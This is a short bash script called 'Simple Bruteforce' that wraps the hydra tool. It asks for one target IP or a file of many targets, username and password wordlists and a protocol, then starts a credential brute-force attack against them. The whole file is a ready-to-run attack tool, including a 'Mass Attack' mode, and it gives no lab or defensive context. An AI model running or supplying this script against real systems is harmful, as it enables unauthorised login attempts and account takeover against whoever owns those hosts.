#!/bin/bash

echo -e "\nWelcome to Simple Bruteforce"
read -p "Please choose the attack mode (1 for Single Target or 2 for Mass Attack): " attack_mode

if [[ $attack_mode -eq 1 ]]
then
	read -p "Target IP: " target_ip
	if [[ ! $target_ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]
	then
		echo -e "Not a valid IP address format\nExiting..."
		exit
	else
		read -p "Username Wordlist Path: " usernames
		read -p "Password Wordlist Path: " passwords
		read -p "Target protocol: " protocol
		execute="hydra -I -L $usernames -P $passwords $protocol://$target_ip"
		$execute
	fi

elif [[ $attack_mode -eq 2 ]]
then
	read -p "Targets: " targets
        read -p "Username Wordlist Path: " usernames
        read -p "Password Wordlist Path: " passwords
        read -p "Target protocol: " protocol
	execute2="hydra -I -L $usernames -P $passwords -M $targets $protocol"
	$execute2

else
	echo -e "You didn't choose the attack mode\nExiting..."

fi
